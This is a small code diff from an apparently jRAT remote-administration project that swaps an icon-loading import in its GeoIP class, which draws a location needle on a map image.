@@ -1,6 +1,6 @@
 package jrat.controller.net;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.AbstractSlave;
 import jrat.controller.utils.NetUtils;
 
@@ -34,7 +34,7 @@ public class GeoIP {
 		
 		if (drawNeedle) {
 			Graphics g = image.createGraphics();
-			Image needle = IconUtils.getIcon("location").getImage();
+			Image needle = Resources.getIcon("location").getImage();
 			g.drawImage(needle, image.getWidth() / 2 - 8, image.getHeight() / 2 - 8, null);
 			g.dispose();
 		}
